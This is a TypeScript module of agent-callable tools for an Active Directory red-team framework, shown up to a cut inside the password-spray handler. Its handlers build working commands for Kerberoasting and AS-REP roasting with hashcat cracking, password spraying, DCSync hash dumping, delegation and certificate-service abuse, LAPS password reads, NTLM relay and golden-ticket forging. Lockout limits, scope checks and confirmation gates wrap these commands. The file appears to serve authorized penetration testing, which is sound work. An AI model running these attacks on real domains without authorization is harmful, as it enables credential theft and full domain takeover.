import { executeInKali } from "../utils/docker-exec";

// =============================================================================
// On-prem Active Directory identity red-team MCP tool module.
//
// Implements the on-prem AD section of docs/identity-redteam-plan.md (Phase 1 AD
// recon + Phase 2 AD exploitation). Mirrors the cloud-recon.ts / cloud-iam.ts
// pattern exactly:
//   - `identityAdTools`    : MCP tool definitions (name, description, inputSchema)
//   - `identityAdHandlers` : Record<string, Function> shelling out via executeInKali
//
// CLOUD W1b LESSON (applied at design time): every handler runs a
// `command -v <tool>` preflight (INSTALLED / NOT INSTALLED) and uses `2>&1` (NOT
// `2>/dev/null`) so a packaging gap is never silently mistaken for an auth
// failure, and real tool errors surface in the output.
//
// SAFETY (docs/identity-redteam-plan.md §15):
//   - LOCKOUT MANDATE: every credential-submitting tool (password_spray_ad,
//     kerbrute-backed spray) reads `lockout_threshold` and stays
//     `<= threshold - lockout_safety_margin`, 1 attempt/user/window, jitter,
//     abort-on-first-lockout. Default 1 attempt; >1 requires explicit opt-in.
//     If no threshold is provided the spray is BLOCKED (no guessed default).
//   - NON-DESTRUCTIVE DEFAULTS: every write / replication / relay / persistence
//     op gates behind an explicit `attempt_*: boolean` defaulting to FALSE
//     (mirrors cloud `attempt_exploitation`). Read-only enumeration runs freely.
//   - MULTI-STEP / MITM ops (ntlm_relay, ADCS ESC8 relay, ACL write) reference
//     the user-confirm protocol in .claude/agents/_preamble.md.
//   - Excluded principals (krbtgt, breakglass, etc.) are NEVER targeted; tools
//     accept and honor an `exclusions` arg in addition to scope-validator gating.
//
// These tools are NOT in LOCAL_ONLY_TOOLS — they take the AD domain / DC / target
// id so the parent's scope validation (identity-scope-validator) applies.
// =============================================================================

// Shell-escape a value for safe single-quoted embedding in a bash command.
// Wraps in single quotes and escapes embedded single quotes via '\''.
function sq(value: string): string {
  return `'${String(value).replace(/'/g, `'\\''`)}'`;
}

// Build the standard tool-availability preflight line (cloud W1b lesson).
function preflight(tool: string, versionFlag = "--version"): string {
  return `command -v ${tool} >/dev/null 2>&1 && echo "${tool}: INSTALLED ($(${tool} ${versionFlag} 2>&1 | head -1))" || echo "${tool}: NOT INSTALLED"`;
}

// Build the authentication fragment shared by impacket/netexec tools:
// 'domain/user:password' or '-hashes :NT' depending on auth_type.
// Returns { authArg, target } where authArg is appended after the binary.
function buildImpacketAuth(args: {
  domain: string;
  username: string;
  password?: string;
  nt_hash?: string;
}): string {
  const { domain, username, password, nt_hash } = args;
  if (nt_hash) {
    // impacket -hashes LMHASH:NTHASH (LM blank => ':NT')
    return `${sq(`${domain}/${username}`)} -hashes ${sq(`:${nt_hash}`)}`;
  }
  return `${sq(`${domain}/${username}:${password ?? ""}`)}`;
}

export const identityAdTools = [
  // ===========================================================================
  // PHASE 1 — AD RECON (deterministic, read-only)
  // ===========================================================================
  {
    name: "enum_ad_domain",
    description:
      "[AD RECON — needs DOMAIN CREDS] Full Active Directory domain collection: bloodhound-python (SharpHound's Linux collector) gathers users, groups, computers, trusts, ACLs, sessions, and ADCS into a BloodHound graph, and ldapdomaindump produces an offline HTML/JSON domain dump. Read-only enumeration — no writes. Requires a network line-of-sight to a Domain Controller (LDAP/389, Kerberos/88, SMB/445) and any low-priv domain credential.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: {
          type: "string",
          description: "Scope identity_targets[].id (kind: active_directory) for scope validation + audit trail",
        },
        domain: { type: "string", description: "AD domain FQDN (e.g. 'corp.example.com')" },
        dc_ip: { type: "string", description: "Domain Controller IP (must also fall within network-scope CIDRs)" },
        username: { type: "string", description: "Low-priv domain username for authenticated collection" },
        password: { type: "string", description: "Domain password (or supply nt_hash)" },
        nt_hash: { type: "string", description: "NT hash for pass-the-hash auth (alternative to password)" },
        collection_method: {
          type: "string",
          description: "bloodhound-python collection method",
          default: "All",
        },
      },
      required: ["identity_target_id", "domain", "dc_ip", "username"],
    },
  },
  {
    name: "enum_ad_kerberos_targets",
    description:
      "[AD RECON — needs DOMAIN CREDS or USER LIST] Enumerate Kerberos attack candidates ONLY (no cracking): list Kerberoastable accounts (SPN-bearing) via impacket GetUserSPNs, and AS-REP-roastable users (DONT_REQ_PREAUTH) via impacket GetNPUsers. AS-REP candidate enumeration needs only a user list; Kerberoast SPN enumeration needs domain creds. Read-only.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        username: { type: "string", description: "Domain username (required for Kerberoast SPN enum)" },
        password: { type: "string", description: "Domain password (or nt_hash)" },
        nt_hash: { type: "string", description: "NT hash (alternative to password)" },
        userlist: {
          type: "string",
          description: "Path to a username list (in-container) for AS-REP candidate enumeration without creds",
        },
      },
      required: ["identity_target_id", "domain", "dc_ip"],
    },
  },
  {
    name: "enum_adcs_templates",
    description:
      "[AD RECON — needs DOMAIN CREDS] Enumerate AD Certificate Services CAs and ESC1-ESC13 vulnerable certificate templates using `certipy find -vulnerable` (no exploitation). Read-only — produces the template inventory the exploit_adcs tool acts on.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        username: { type: "string", description: "Domain username" },
        password: { type: "string", description: "Domain password (or nt_hash)" },
        nt_hash: { type: "string", description: "NT hash (alternative to password)" },
        vulnerable_only: {
          type: "boolean",
          description: "Only report ESC-vulnerable templates (certipy find -vulnerable). False = full enumeration.",
          default: true,
        },
      },
      required: ["identity_target_id", "domain", "dc_ip", "username"],
    },
  },

  // ===========================================================================
  // PHASE 2 — AD EXPLOITATION
  // ===========================================================================
  {
    name: "kerberoast",
    description:
      "[AD EXPLOIT — needs DOMAIN CREDS — non-destructive] Kerberoast: request TGS-REP hashes for SPN-bearing accounts via impacket GetUserSPNs -request, then crack them offline with hashcat (mode 13100) against a wordlist. Reports cracked service-account credentials. Read-only request + offline crack — no directory changes.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        username: { type: "string", description: "Domain username" },
        password: { type: "string", description: "Domain password (or nt_hash)" },
        nt_hash: { type: "string", description: "NT hash (alternative to password)" },
        wordlist: {
          type: "string",
          description: "In-container wordlist path for hashcat",
          default: "/usr/share/wordlists/rockyou.txt",
        },
        crack: {
          type: "boolean",
          description: "Run hashcat against the requested hashes (offline crack). False = request hashes only.",
          default: true,
        },
      },
      required: ["identity_target_id", "domain", "dc_ip", "username"],
    },
  },
  {
    name: "asrep_roast",
    description:
      "[AD EXPLOIT — needs USER LIST — non-destructive] AS-REP roasting: extract AS-REP hashes for accounts with Kerberos pre-auth disabled via impacket GetNPUsers, then crack offline with hashcat (mode 18200). Needs only a user list (no creds). Read-only extraction + offline crack.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        userlist: { type: "string", description: "In-container path to a username list" },
        username: { type: "string", description: "Single username to test (alternative to userlist)" },
        password: { type: "string", description: "Optional domain password for authenticated enumeration" },
        wordlist: { type: "string", description: "Wordlist for hashcat", default: "/usr/share/wordlists/rockyou.txt" },
        crack: { type: "boolean", description: "Run hashcat on extracted hashes", default: true },
      },
      required: ["identity_target_id", "domain", "dc_ip"],
    },
  },
  {
    name: "password_spray_ad",
    description:
      "[AD EXPLOIT — needs USER LIST — LOCKOUT-GATED, §15] Lockout-aware AD password spray via kerbrute/NetExec. THE LOCKOUT MANDATE APPLIES: you MUST pass lockout_threshold; attempts/user/window are capped at lockout_threshold - lockout_safety_margin; defaults to ONE attempt/user/window with jitter; aborts on first observed lockout. >1 attempt requires explicit attempts_per_user opt-in. If lockout_threshold is omitted the spray is BLOCKED (no guessed default). Never targets excluded principals (krbtgt/breakglass).",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        userlist: { type: "string", description: "In-container path to a username list to spray across" },
        passwords: {
          type: "array",
          items: { type: "string" },
          description: "Candidate passwords to spray (sprayed ACROSS users, one per window — never down one account)",
        },
        lockout_threshold: {
          type: "number",
          description: "MANDATORY. The domain account lockout threshold (failed attempts before lock). Spray is BLOCKED if absent.",
        },
        lockout_safety_margin: {
          type: "number",
          description: "Stay this many attempts below lockout_threshold (hard floor)",
          default: 2,
        },
        attempts_per_user: {
          type: "number",
          description: "Attempts per user per window. Defaults to 1; values >1 are explicit opt-in and still capped at threshold - margin.",
          default: 1,
        },
        jitter_seconds: {
          type: "number",
          description: "Seconds of jitter between spray batches",
          default: 60,
        },
        abort_on_first_lockout: {
          type: "boolean",
          description: "Halt the entire spray the moment one account is observed locked",
          default: true,
        },
        exclusions: {
          type: "array",
          items: { type: "string" },
          description: "Usernames to NEVER spray (krbtgt, breakglass, etc.) — hard-removed from the user list",
        },
      },
      required: ["identity_target_id", "domain", "dc_ip", "userlist", "passwords", "lockout_threshold"],
    },
  },
  {
    name: "abuse_ad_acl",
    description:
      "[AD EXPLOIT — needs DOMAIN CREDS + a discovered ACL edge] Abuse a BloodHound-discovered ACL edge (GenericAll / WriteDACL / WriteOwner / AddMember / ForceChangePassword) via impacket dacledit/owneredit or bloodyAD. DEFAULT IS READ-ONLY (enumerate/show the edge). Any WRITE (group add, DACL edit, password reset) requires attempt_write=true AND follows the multi-step user-confirm protocol (.claude/agents/_preamble.md) — never executed silently. Never targets excluded principals.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        username: { type: "string", description: "Domain username holding the ACL edge" },
        password: { type: "string", description: "Domain password (or nt_hash)" },
        nt_hash: { type: "string", description: "NT hash (alternative to password)" },
        target_principal: { type: "string", description: "The object the ACL edge is over (group/user to modify)" },
        edge_type: {
          type: "string",
          enum: ["GenericAll", "WriteDACL", "WriteOwner", "AddMember", "ForceChangePassword"],
          description: "The ACL edge to abuse",
        },
        attempt_write: {
          type: "boolean",
          description: "Perform the actual directory WRITE. Defaults FALSE (read-only). Requires user-confirm per §15.2.",
          default: false,
        },
        exclusions: {
          type: "array",
          items: { type: "string" },
          description: "Principals to NEVER modify",
        },
      },
      required: ["identity_target_id", "domain", "dc_ip", "username", "target_principal", "edge_type"],
    },
  },
  {
    name: "dcsync",
    description:
      "[AD EXPLOIT — needs REPLICATION RIGHTS — read-only] DCSync via impacket secretsdump -just-dc: pull NTLM hashes (incl. krbtgt) from the DC using DRSUAPI replication to prove DA-equivalent access. This is a READ-ONLY replication request (no directory writes), but it is high-impact, so it is gated behind attempt_dcsync=true (defaults FALSE). NEVER dumps an excluded principal's secret into output beyond proof of access.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        username: { type: "string", description: "Username with replication (DCSync) rights" },
        password: { type: "string", description: "Password (or nt_hash)" },
        nt_hash: { type: "string", description: "NT hash (alternative to password)" },
        target_user: {
          type: "string",
          description: "Specific account to DCSync (e.g. 'krbtgt' to prove DA, or a target user). Omit for all.",
        },
        attempt_dcsync: {
          type: "boolean",
          description: "Perform the DCSync replication pull. Defaults FALSE — set true to prove DA-equivalent access.",
          default: false,
        },
      },
      required: ["identity_target_id", "domain", "dc_ip", "username"],
    },
  },
  {
    name: "abuse_delegation",
    description:
      "[AD EXPLOIT — needs DOMAIN CREDS + a delegation edge — non-destructive] Abuse Kerberos delegation: unconstrained (extract TGTs), constrained (impacket getST -impersonate via S4U2Self/S4U2Proxy), or resource-based constrained delegation (RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity then getST). Default ENUMERATES the delegation edge only. RBCD requires a directory write, so attempt_rbcd_write=true is required AND follows the user-confirm protocol; getST impersonation (no persistent write) is non-destructive.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        username: { type: "string", description: "Domain username / controlled account" },
        password: { type: "string", description: "Password (or nt_hash)" },
        nt_hash: { type: "string", description: "NT hash (alternative to password)" },
        delegation_type: {
          type: "string",
          enum: ["unconstrained", "constrained", "rbcd"],
          description: "Delegation flavor to abuse",
        },
        impersonate_user: { type: "string", description: "User to impersonate via S4U (e.g. 'Administrator')" },
        target_spn: { type: "string", description: "Target service SPN to request a ticket for (e.g. 'cifs/dc.corp.example.com')" },
        target_computer: { type: "string", description: "For RBCD: the computer object to configure delegation on" },
        attempt_rbcd_write: {
          type: "boolean",
          description: "For RBCD only: perform the msDS-AllowedToActOnBehalf write. Defaults FALSE. Requires user-confirm per §15.2.",
          default: false,
        },
      },
      required: ["identity_target_id", "domain", "dc_ip", "username", "delegation_type"],
    },
  },
  {
    name: "exploit_adcs",
    description:
      "[AD EXPLOIT — needs DOMAIN CREDS (ESC8 = relay) — non-destructive*] Exploit an AD CS misconfiguration (Certipy ESC1-ESC8/ESC11/ESC13): request a certificate as a privileged user against a vulnerable template, then authenticate with it (PKINIT -> TGT -> optional secretsdump) to prove escalation. Cert request + PKINIT auth is non-destructive (issues a cert to self). ESC8 uses NTLM relay (MITM position) — attempt_esc8_relay=true required AND follows the user-confirm/multi-step protocol.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        username: { type: "string", description: "Domain username" },
        password: { type: "string", description: "Password (or nt_hash)" },
        nt_hash: { type: "string", description: "NT hash (alternative to password)" },
        ca: { type: "string", description: "Certificate Authority name (from enum_adcs_templates)" },
        template: { type: "string", description: "Vulnerable certificate template name" },
        esc_type: {
          type: "string",
          enum: ["ESC1", "ESC2", "ESC3", "ESC4", "ESC8", "ESC11", "ESC13"],
          description: "The ESC technique to exploit",
        },
        target_upn: {
          type: "string",
          description: "UPN to enroll the cert as (e.g. 'administrator@corp.example.com') for ESC1",
        },
        attempt_request: {
          type: "boolean",
          description: "Perform the cert request + PKINIT auth (non-destructive). Defaults FALSE — enumerate only when false.",
          default: false,
        },
        attempt_esc8_relay: {
          type: "boolean",
          description: "ESC8 only: stand up the NTLM relay to the CA web endpoint (MITM). Defaults FALSE. Requires user-confirm per §15.2.",
          default: false,
        },
      },
      required: ["identity_target_id", "domain", "dc_ip", "username", "esc_type"],
    },
  },
  {
    name: "read_laps",
    description:
      "[AD EXPLOIT — needs DOMAIN CREDS + LAPS-read right — read-only] Read LAPS-managed local administrator passwords the current identity is entitled to, via NetExec --laps or bloodyAD/ldapsearch on ms-Mcs-AdmPwd / msLAPS-Password. Pure read of an attribute the ACL already grants — no writes. Internal report shows the real recovered passwords (never redact, per the evidence rule).",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        username: { type: "string", description: "Domain username with LAPS-read entitlement" },
        password: { type: "string", description: "Password (or nt_hash)" },
        nt_hash: { type: "string", description: "NT hash (alternative to password)" },
        computer: {
          type: "string",
          description: "Specific computer name to read the LAPS password for. Omit to read all readable.",
        },
      },
      required: ["identity_target_id", "domain", "dc_ip", "username"],
    },
  },
  {
    name: "ntlm_relay",
    description:
      "[AD EXPLOIT — needs MITM POSITION — MULTI-STEP, USER-CONFIRM §15.2] NTLM/SMB relay via impacket ntlmrelayx (optionally fed by mitm6/Responder coercion): relay coerced authentication to LDAP/SMB/ADCS-HTTP to add a computer, grant RBCD, or enroll a cert. This requires a MITM/coercion position and is the most operationally sensitive AD op — attempt_relay=true is required AND the multi-step user-confirm protocol MUST run first (present what was found, the exact setup, feasibility, YES/NO). Defaults to printing the relay PLAN only.",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        relay_target: {
          type: "string",
          description: "Relay destination (e.g. 'ldaps://dc.corp.example.com' or the ADCS web endpoint) — must be in-scope",
        },
        relay_mode: {
          type: "string",
          enum: ["ldap", "smb", "adcs_http"],
          description: "What protocol to relay coerced auth to",
        },
        coercion: {
          type: "string",
          enum: ["none", "mitm6", "responder"],
          description: "Coercion source to feed the relay (none = passively listen)",
          default: "none",
        },
        attempt_relay: {
          type: "boolean",
          description: "Actually start ntlmrelayx. Defaults FALSE — prints the relay plan only. Requires user-confirm per §15.2.",
          default: false,
        },
      },
      required: ["identity_target_id", "domain", "relay_target", "relay_mode"],
    },
  },
  {
    name: "golden_ticket",
    description:
      "[AD EXPLOIT — needs krbtgt HASH (post-DCSync) — non-destructive] Forge a Golden TGT (or Silver TGS) from the krbtgt NT hash via impacket ticketer, then use it to prove persistence/DA-equivalent access (e.g. secretsdump with the forged ticket). Forge + use only — NO account or directory changes. Gated behind attempt_forge=true (defaults FALSE).",
    inputSchema: {
      type: "object",
      properties: {
        identity_target_id: { type: "string", description: "Scope identity_targets[].id (active_directory)" },
        domain: { type: "string", description: "AD domain FQDN" },
        dc_ip: { type: "string", description: "Domain Controller IP (in network scope)" },
        ticket_type: {
          type: "string",
          enum: ["golden", "silver"],
          description: "golden = krbtgt-signed TGT (whole domain); silver = service-account-signed TGS (one service)",
          default: "golden",
        },
        krbtgt_hash: { type: "string", description: "krbtgt NT hash (golden) — from a prior dcsync" },
        service_hash: { type: "string", description: "Service account NT hash (silver)" },
        domain_sid: { type: "string", description: "Domain SID (required to forge a valid ticket)" },
        impersonate_user: {
          type: "string",
          description: "User to forge the ticket as (e.g. 'Administrator')",
          default: "Administrator",
        },
        target_spn: { type: "string", description: "Target SPN for a silver ticket (e.g. 'cifs/dc.corp.example.com')" },
        attempt_forge: {
          type: "boolean",
          description: "Forge (and use) the ticket to prove persistence. Defaults FALSE.",
          default: false,
        },
      },
      required: ["identity_target_id", "domain", "domain_sid"],
    },
  },
];

export const identityAdHandlers: Record<string, Function> = {
  // ===========================================================================
  // PHASE 1 — RECON
  // ===========================================================================
  enum_ad_domain: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    username: string;
    password?: string;
    nt_hash?: string;
    collection_method?: string;
  }) => {
    const { identity_target_id, domain, dc_ip, username, password, nt_hash, collection_method = "All" } = args;
    const commands: string[] = [
      `echo "=== AD Domain Enumeration (BloodHound + ldapdomaindump) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("bloodhound-python"),
      preflight("ldapdomaindump", "-h"),
      `echo ""`,
    ];

    // bloodhound-python authenticates via password or -hashes.
    const bhAuth = nt_hash ? `--hashes ${sq(`:${nt_hash}`)}` : `-p ${sq(password ?? "")}`;
    commands.push(`echo "--- BloodHound collection (method: ${collection_method}) ---"`);
    commands.push(`mkdir -p /tmp/bloodhound-${identity_target_id} 2>&1`);
    commands.push(
      `cd /tmp/bloodhound-${identity_target_id} && bloodhound-python -d ${sq(domain)} -u ${sq(username)} ${bhAuth} -ns ${sq(dc_ip)} -c ${sq(collection_method)} --zip 2>&1 || echo "bloodhound-python FAILED (see stderr above; auth failure vs not-installed)"`
    );
    commands.push(`echo ""`);
    commands.push(`echo "--- BloodHound output files ---"`);
    commands.push(`ls -la /tmp/bloodhound-${identity_target_id}/ 2>&1 || echo "no bloodhound output"`);
    commands.push(`echo ""`);

    // ldapdomaindump offline dump.
    const lddAuth = nt_hash ? `${sq(`${domain}\\${username}`)} --authtype NTLM -p ${sq(`:${nt_hash}`)}` : `${sq(`${domain}\\${username}`)} -p ${sq(password ?? "")}`;
    commands.push(`echo "--- ldapdomaindump ---"`);
    commands.push(`mkdir -p /tmp/ldapdump-${identity_target_id} 2>&1`);
    commands.push(
      `ldapdomaindump -u ${lddAuth} -o /tmp/ldapdump-${identity_target_id} ${sq(dc_ip)} 2>&1 || echo "ldapdomaindump FAILED (see stderr above)"`
    );
    commands.push(`echo ""`);
    commands.push(`echo "--- ldapdomaindump summary (domain_users / domain_groups / trusts) ---"`);
    commands.push(`cat /tmp/ldapdump-${identity_target_id}/domain_trusts.json 2>&1 | head -c 20000 || echo "no trust dump"`);
    commands.push(`echo ""`);
    commands.push(`echo "=== AD Domain Enumeration Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  enum_ad_kerberos_targets: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    username?: string;
    password?: string;
    nt_hash?: string;
    userlist?: string;
  }) => {
    const { identity_target_id, domain, dc_ip, username, password, nt_hash, userlist } = args;
    const commands: string[] = [
      `echo "=== Kerberos Attack-Candidate Enumeration (no cracking) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("GetUserSPNs.py"),
      preflight("GetNPUsers.py"),
      `echo ""`,
    ];

    // Kerberoastable SPN candidates (needs creds).
    if (username) {
      const auth = buildImpacketAuth({ domain, username, password, nt_hash });
      commands.push(`echo "--- Kerberoastable SPNs (GetUserSPNs, candidate list only) ---"`);
      commands.push(
        `GetUserSPNs.py ${auth} -dc-ip ${sq(dc_ip)} 2>&1 || echo "GetUserSPNs FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
    } else {
      commands.push(`echo "--- Kerberoastable SPNs: SKIPPED (no domain creds supplied) ---"`);
      commands.push(`echo ""`);
    }

    // AS-REP roastable candidates (needs only a user list).
    commands.push(`echo "--- AS-REP roastable users (GetNPUsers, candidate list only) ---"`);
    if (userlist) {
      commands.push(
        `GetNPUsers.py ${sq(`${domain}/`)} -usersfile ${sq(userlist)} -dc-ip ${sq(dc_ip)} -no-pass 2>&1 || echo "GetNPUsers (userlist) FAILED (see stderr above)"`
      );
    } else if (username) {
      const auth = buildImpacketAuth({ domain, username, password, nt_hash });
      commands.push(
        `GetNPUsers.py ${auth} -dc-ip ${sq(dc_ip)} -request 2>&1 || echo "GetNPUsers (authenticated) FAILED (see stderr above)"`
      );
    } else {
      commands.push(`echo "AS-REP enumeration needs a userlist or a username — none supplied"`);
    }
    commands.push(`echo ""`);
    commands.push(`echo "=== Kerberos Candidate Enumeration Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  enum_adcs_templates: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    username: string;
    password?: string;
    nt_hash?: string;
    vulnerable_only?: boolean;
  }) => {
    const { identity_target_id, domain, dc_ip, username, password, nt_hash, vulnerable_only = true } = args;
    const auth = nt_hash
      ? `-u ${sq(`${username}@${domain}`)} -hashes ${sq(`:${nt_hash}`)}`
      : `-u ${sq(`${username}@${domain}`)} -p ${sq(password ?? "")}`;
    const commands: string[] = [
      `echo "=== AD CS Template Enumeration (Certipy) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}  vulnerable_only: ${vulnerable_only}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("certipy"),
      `echo ""`,
      `echo "--- certipy find ---"`,
      `mkdir -p /tmp/certipy-${identity_target_id} 2>&1`,
      `cd /tmp/certipy-${identity_target_id} && certipy find ${auth} -dc-ip ${sq(dc_ip)}${vulnerable_only ? " -vulnerable" : ""} -stdout 2>&1 || echo "certipy find FAILED (see stderr above; auth failure vs not-installed)"`,
      `echo ""`,
      `echo "=== AD CS Template Enumeration Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  // ===========================================================================
  // PHASE 2 — EXPLOITATION
  // ===========================================================================
  kerberoast: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    username: string;
    password?: string;
    nt_hash?: string;
    wordlist?: string;
    crack?: boolean;
  }) => {
    const { identity_target_id, domain, dc_ip, username, password, nt_hash, wordlist = "/usr/share/wordlists/rockyou.txt", crack = true } = args;
    const auth = buildImpacketAuth({ domain, username, password, nt_hash });
    const outfile = `/tmp/kerberoast-${identity_target_id}.hashes`;
    const commands: string[] = [
      `echo "=== Kerberoasting (request TGS + offline crack) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}  crack: ${crack}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("GetUserSPNs.py"),
      preflight("hashcat"),
      `echo ""`,
      `echo "--- Requesting TGS-REP hashes (GetUserSPNs -request) ---"`,
      `GetUserSPNs.py ${auth} -dc-ip ${sq(dc_ip)} -request -outputfile ${sq(outfile)} 2>&1 || echo "GetUserSPNs -request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Requested hashes ---"`,
      `cat ${sq(outfile)} 2>&1 || echo "no hashes written"`,
      `echo ""`,
    ];
    if (crack) {
      commands.push(`echo "--- Cracking (hashcat -m 13100) ---"`);
      commands.push(
        `hashcat -m 13100 -a 0 ${sq(outfile)} ${sq(wordlist)} --quiet 2>&1 || echo "hashcat run FAILED or no crack (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "--- Cracked credentials (hashcat --show) ---"`);
      commands.push(`hashcat -m 13100 ${sq(outfile)} --show 2>&1 || echo "no cracked hashes"`);
      commands.push(`echo ""`);
    } else {
      commands.push(`echo "--- Cracking SKIPPED (crack=false) ---"`);
      commands.push(`echo ""`);
    }
    commands.push(`echo "=== Kerberoasting Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  asrep_roast: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    userlist?: string;
    username?: string;
    password?: string;
    wordlist?: string;
    crack?: boolean;
  }) => {
    const { identity_target_id, domain, dc_ip, userlist, username, password, wordlist = "/usr/share/wordlists/rockyou.txt", crack = true } = args;
    const outfile = `/tmp/asrep-${identity_target_id}.hashes`;
    const commands: string[] = [
      `echo "=== AS-REP Roasting (extract + offline crack) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}  crack: ${crack}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("GetNPUsers.py"),
      preflight("hashcat"),
      `echo ""`,
      `echo "--- Extracting AS-REP hashes (GetNPUsers) ---"`,
    ];
    if (userlist) {
      commands.push(
        `GetNPUsers.py ${sq(`${domain}/`)} -usersfile ${sq(userlist)} -dc-ip ${sq(dc_ip)} -no-pass -outputfile ${sq(outfile)} 2>&1 || echo "GetNPUsers (userlist) FAILED (see stderr above)"`
      );
    } else if (username) {
      const userPart = password ? `${sq(`${domain}/${username}:${password}`)}` : `${sq(`${domain}/${username}`)} -no-pass`;
      commands.push(
        `GetNPUsers.py ${userPart} -dc-ip ${sq(dc_ip)} -outputfile ${sq(outfile)} 2>&1 || echo "GetNPUsers (single user) FAILED (see stderr above)"`
      );
    } else {
      commands.push(`echo "ERROR: asrep_roast needs a userlist or username"`);
    }
    commands.push(`echo ""`);
    commands.push(`echo "--- Extracted hashes ---"`);
    commands.push(`cat ${sq(outfile)} 2>&1 || echo "no hashes written"`);
    commands.push(`echo ""`);
    if (crack) {
      commands.push(`echo "--- Cracking (hashcat -m 18200) ---"`);
      commands.push(
        `hashcat -m 18200 -a 0 ${sq(outfile)} ${sq(wordlist)} --quiet 2>&1 || echo "hashcat run FAILED or no crack (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "--- Cracked credentials (hashcat --show) ---"`);
      commands.push(`hashcat -m 18200 ${sq(outfile)} --show 2>&1 || echo "no cracked hashes"`);
      commands.push(`echo ""`);
    } else {
      commands.push(`echo "--- Cracking SKIPPED (crack=false) ---"`);
      commands.push(`echo ""`);
    }
    commands.push(`echo "=== AS-REP Roasting Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  password_spray_ad: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    userlist: string;
    passwords: string[];
    lockout_threshold?: number;
    lockout_safety_margin?: number;
    attempts_per_user?: number;
    jitter_seconds?: number;
    abort_on_first_lockout?: boolean;
    exclusions?: string[];
  }) => {
    const {
      identity_target_id,
      domain,
      dc_ip,
      userlist,
      passwords,
      lockout_threshold,
      lockout_safety_margin = 2,
      attempts_per_user = 1,
      jitter_seconds = 60,
      abort_on_first_lockout = true,
      exclusions = [],
    } = args;

    // ===== LOCKOUT MANDATE (§15.1) — enforced in behavior, not just description =====
    // 1. Read the threshold first. If absent, the spray is BLOCKED (no guessed default).
    if (lockout_threshold === undefined || lockout_threshold === null) {
      return JSON.stringify({
        status: "BLOCKED",
        reason: "LOCKOUT_THRESHOLD_REQUIRED",
        tool: "password_spray_ad",
        target: identity_target_id,
        message:
          "Lockout Mandate (§15.1): password_spray_ad requires an explicit lockout_threshold from the in-scope identity_targets[] entry. No safe default is guessed. Spray BLOCKED.",
      });
    }

    // 2. Stay under the line: attempts/user/window <= threshold - safety_margin.
    const maxSafeAttempts = lockout_threshold - lockout_safety_margin;
    if (maxSafeAttempts < 1) {
      return JSON.stringify({
        status: "BLOCKED",
